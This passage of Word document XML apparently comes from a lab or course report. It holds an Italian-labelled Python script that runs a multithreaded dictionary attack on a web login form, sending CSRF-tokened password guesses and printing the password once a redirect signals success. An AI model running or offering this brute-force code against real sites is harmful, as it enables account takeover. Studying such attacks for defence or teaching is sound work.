            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve"> = </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>get_csrf_token</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>()</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>tentativi</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve"> = 0</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>found = None</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">def </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>try_password</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(password):</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">    global </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>tentativi</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>, found</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">    if </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>stop_event.is_set</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>():</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">        return</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">    data = {"email": EMAIL, "password": password, "</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>csrfmiddlewaretoken</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve">": </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>csrf_token</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">    try:</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">        r = </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>session.post</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve">(LOGIN_URL, data=data, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>allow_redirects</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>=False, timeout=10)</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">    except </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>requests.exceptions.RequestException</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">        return</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">    with lock:</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">        </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>tentativi</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve"> += 1</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">    </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>time.sleep</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(0.02)</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">    if </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>r.status_code</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve"> == 302:</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">        with lock:</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">            if not found:</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">                found = password</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">                </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>stop_event.set</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>()</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">if not </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>os.path.exists</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(DIZIONARIO_PATH):</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">    print(</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>f"File</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>dizionario</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve"> non trovato: {DIZIONARIO_PATH}")</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">    </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>sys.exit</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(1)</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t>with open(DIZIONARIO_PATH, "r", encoding="utf-8-sig", errors="ignore") as f:</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">    passwords = [</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>line.strip</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve">() for line in f if </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>line.strip</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>()]</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t>print("</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>Avvio</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>attacco</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve"> a </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>dizionario</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>...")</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">start = </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>time.time</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>()</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">with </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>ThreadPoolExecutor</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>max_workers</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>=3) as executor:</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">    </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>executor.map</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>try_password</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>, passwords)</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">end = </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>time.time</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>()</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t>total = end - start</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t>if found:</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">    print("ATTACCO RIUSCITO")</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">    print(</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>f"Email</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>: {EMAIL}")</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">    print(</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>f"Password</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
